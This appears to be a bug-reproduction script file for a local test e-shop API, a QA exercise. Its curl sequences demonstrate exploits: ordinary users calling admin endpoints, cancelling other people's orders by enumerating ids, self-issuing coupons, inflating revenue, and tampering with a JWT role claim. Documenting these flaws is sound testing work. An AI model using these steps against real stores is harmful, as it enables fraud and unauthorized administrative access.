/**
 * Kịch bản tái hiện lỗi của API 3 (PUT /api/admin/orders/:id/status),
 * dùng bởi scripts/capture-bug-evidence.js.
 *
 * Lệnh ở đây phải TRÙNG với mục "Tái hiện" trong docs/Bug-Report.md.
 */

const RESET = "./scripts/reset-db.sh >/dev/null 2>&1";
const ADMIN =
  `AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' ` +
  `-d '{"email":"admin@eshop.com","password":"Admin123!"}' | jq -r .token)`;
const USER =
  `UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' ` +
  `-d '{"email":"test@eshop.com","password":"Test1234!"}' | jq -r .token)`;
const MKORDER =
  `OID=$(curl -s -X POST localhost:3000/api/checkout -H "Authorization: Bearer $UT" ` +
  `-H 'Content-Type: application/json' -d '{"total_amount":1000,"shipping_address":"x"}' | jq -r .orderId)`;

module.exports = [
  {
    id: "BUG-A3-01",
    title: "Không kiểm role — user thường đổi được trạng thái mọi đơn hàng (FR-12, SEC-03)",
    cmds: [
      `${RESET}; ${USER}; ${MKORDER}
echo "don $OID, dung TOKEN USER THUONG goi API admin:"
for s in confirmed shipping delivered; do
  printf '  user doi -> %-10s HTTP ' "$s"
  curl -s -o /dev/null -w '%{http_code}  ' -X PUT localhost:3000/api/admin/orders/$OID/status -H "Authorization: Bearer $UT" -H 'Content-Type: application/json' -d "{\\"status\\":\\"$s\\"}"
  echo "trang thai: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)"
done
echo
echo 'Diem tot: chu ky JWT VAN duoc kiem dung -'
FAKE=$(node -e "const t=process.argv[1].split('.');const p=JSON.parse(Buffer.from(t[1],'base64url').toString());p.role='admin';console.log(t[0]+'.'+Buffer.from(JSON.stringify(p)).toString('base64url')+'.'+t[2]);" "$UT")
curl -s -o /dev/null -w '  token sua role ma khong ky lai -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H "Authorization: Bearer $FAKE" -H 'Content-Type: application/json' -d '{"status":"canceled"}'`,
    ],
  },
  {
    id: "BUG-A3-02",
    title: "canceled → delivered được chấp nhận, phá vỡ trạng thái kết thúc (FR-10)",
    cmds: [
      `${RESET}; ${ADMIN}; ${USER}
OID=$(curl -s -X POST localhost:3000/api/checkout -H "Authorization: Bearer $UT" -H 'Content-Type: application/json' -d '{"total_amount":9000000,"shipping_address":"x"}' | jq -r .orderId)
curl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$OID/status -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d '{"status":"canceled"}'
echo "sau khi huy      : $(curl -s localhost:3000/api/orders/$OID | jq -r .status)"
curl -s -o /dev/null -w 'doi sang delivered -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d '{"status":"delivered"}'
echo "trang thai cuoi  : $(curl -s localhost:3000/api/orders/$OID | jq -r .status)"
echo
echo 'FR-10: "delivered va canceled la trang thai KET THUC - khong duoc chuyen di dau nua"'`,
    ],
  },
  {
    id: "BUG-A3-03",
    title: "Hai chuyển đổi mâu thuẫn đồng thời cùng trả 200",
    cmds: [
      `${RESET}; ${ADMIN}; ${USER}
for run in 1 2 3; do
  OID=$(curl -s -X POST localhost:3000/api/checkout -H "Authorization: Bearer $UT" -H 'Content-Type: application/json' -d '{"total_amount":1,"shipping_address":"z"}' | jq -r .orderId)
  A=$(mktemp); C=$(mktemp)
  curl -s -o /dev/null -w '%{http_code}' -X PUT localhost:3000/api/admin/orders/$OID/status -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d '{"status":"confirmed"}' > $A &
  curl -s -o /dev/null -w '%{http_code}' -X PUT localhost:3000/api/admin/orders/$OID/status -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d '{"status":"canceled"}' > $C &
  wait
  echo "  luot $run: confirmed->$(cat $A) | canceled->$(cat $C) | trang thai cuoi: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)"
  rm -f $A $C
done
echo
echo '(ca hai deu bao thanh cong, nhung chi mot cai co hieu luc - va ket qua KHONG tat dinh)'`,
    ],
  },
  {
    id: "BUG-A3-04",
    title: "Toàn bộ /api/admin/* thiếu kiểm role — chiếm quyền quản trị bằng tài khoản khách",
    cmds: [
      `${RESET}; ${USER}
H=(-H "Authorization: Bearer $UT" -H 'Content-Type: application/json')
echo 'Goi bang TOKEN USER THUONG:'
curl -s -o /dev/null -w '  GET    /api/admin/users           -> %{http_code}\\n' localhost:3000/api/admin/users "\${H[@]}"
curl -s -o /dev/null -w '  GET    /api/admin/orders          -> %{http_code}\\n' localhost:3000/api/admin/orders "\${H[@]}"
curl -s -o /dev/null -w '  POST   /api/admin/coupons         -> %{http_code}\\n' -X POST localhost:3000/api/admin/coupons "\${H[@]}" -d '{"code":"HACK","type":"percent","discount_value":99,"min_order_amount":0,"expired_at":"2099-01-01","max_uses_per_user":99}'
curl -s -o /dev/null -w '  POST   /api/admin/import-products -> %{http_code}\\n' -X POST localhost:3000/api/admin/import-products "\${H[@]}" -d '{"products":[{"name":"X","price":1,"description":"","imageUrl":"","category_id":1}]}'
curl -s -o /dev/null -w '  DELETE /api/admin/users/9999      -> %{http_code}\\n' -X DELETE localhost:3000/api/admin/users/9999 "\${H[@]}"
echo
echo 'Va thao tac THAT SU co hieu luc:'
echo '  bang nguoi dung doc duoc:'
curl -s localhost:3000/api/admin/users "\${H[@]}" | jq -c '.[0:2]'
echo '  ma giam gia 99% do user thuong tu tao:'
curl -s localhost:3000/api/coupons "\${H[@]}" | jq -c '.[] | select(.code=="HACK")'`,
    ],
  },
  {
    id: "BUG-A3-05",
    title: "Người dùng lạ hủy được đơn hàng của người khác",
    cmds: [
      `${RESET}; ${USER}; ${MKORDER}
echo "don $OID thuoc user id $(curl -s localhost:3000/api/orders/$OID | jq -r .user_id)"
curl -s -o /dev/null -X POST localhost:3000/api/register -H 'Content-Type: application/json' -d '{"name":"Ke La","email":"kela@hw06.local","password":"Test1234!"}'
XT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{"email":"kela@hw06.local","password":"Test1234!"}' | jq -r .token)
echo 'nguoi HOAN TOAN XA LA huy don do:'
curl -s -o /dev/null -w '  -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H "Authorization: Bearer $XT" -H 'Content-Type: application/json' -d '{"status":"canceled"}'
echo "  trang thai don: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)"
echo
echo 'va vi id don la so nguyen tang dan, duyet 1..N la huy sach ca he thong:'
for i in 1 2 3; do
  curl -s -o /dev/null -X POST localhost:3000/api/checkout -H "Authorization: Bearer $UT" -H 'Content-Type: application/json' -d '{"total_amount":1000,"shipping_address":"x"}'
done
for i in 1 2 3; do printf '  huy don %s -> HTTP ' "$i"; curl -s -o /dev/null -w '%{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$i/status -H "Authorization: Bearer $XT" -H 'Content-Type: application/json' -d '{"status":"canceled"}'; done`,
    ],
  },
  {
    id: "BUG-A3-06",
    title: "Ghép BUG-A2-01 + BUG-A3-01: khách tự ghi doanh thu vào dashboard",
    cmds: [
      `${RESET}; ${ADMIN}; ${USER}
H=(-H "Authorization: Bearer $UT" -H 'Content-Type: application/json')
echo 'Chuoi khai thac chi dung MOT tai khoan khach binh thuong:'
O=$(curl -s -X POST localhost:3000/api/checkout "\${H[@]}" -d '{"total_amount":999999999999,"shipping_address":"x"}' | jq -r .orderId)
echo "  1. tu khai don tri gia 999.999.999.999 (BUG-A2-01) -> don $O"
for s in confirmed shipping delivered; do curl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$O/status "\${H[@]}" -d "{\\"status\\":\\"$s\\"}"; done
echo "  2. tu day don sang delivered (BUG-A3-01) -> $(curl -s localhost:3000/api/orders/$O | jq -r .status)"
printf '  3. FR-13 doanh thu = tong total_amount cac don delivered = '
curl -s localhost:3000/api/admin/orders -H "Authorization: Bearer $AT" | jq '[.[] | select(.status=="delivered") | .total_amount] | add'
echo
echo '  ... va so am cung duoc:'
O2=$(curl -s -X POST localhost:3000/api/checkout "\${H[@]}" -d '{"total_amount":-999999999999,"shipping_address":"x"}' | jq -r .orderId)
for s in confirmed shipping delivered; do curl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$O2/status "\${H[@]}" -d "{\\"status\\":\\"$s\\"}"; done
printf '     doanh thu sau do = '
curl -s localhost:3000/api/admin/orders -H "Authorization: Bearer $AT" | jq '[.[] | select(.status=="delivered") | .total_amount] | add'`,
    ],
  },
];
